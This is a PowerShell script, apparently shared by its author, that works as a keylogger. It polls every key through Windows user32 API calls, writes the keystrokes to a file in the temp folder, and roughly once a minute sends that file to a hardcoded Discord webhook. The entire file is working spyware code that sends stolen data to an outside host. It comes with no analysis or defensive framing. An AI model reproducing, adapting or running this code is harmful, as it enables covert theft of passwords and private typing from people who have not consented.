# MADE BY SYKE
# Discord: syke#1166 / Syke#1166

 
 $generateLog = New-Item -Path $env:temp/keylogger.log -ItemType File -Force

 function Webhook($webhookUri = 'https://discord.com/api/webhooks/941322499986190466/ehCY6Aczy1BD39n5ukLpXrfg45vGb8qWYoWUr3_l3EBTJenVuVevW21gprFZC4_F4Y87'){
     
    $Body = @{
  
        'content' = get-content $env:temp/keylogger.log
        }
      Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
     }


# keylogger
function Keylogger($logFile="$env:temp/keylogger.log") {


   # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru


   # generate log file
 
  


      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $generateLog = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
           

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($logFile, $mychar, [System.Text.Encoding]::Unicode) 
          }
          
        }
      }
      
    }
    
     $time = Get-Date -Format mm
     
     

      while($true)
     {
     Keylogger
     $time2 = Get-Date -Format mm
     if($time -ne $time2)
     {
         
         Webhook
         $time = $time2
      }

    
     
     }

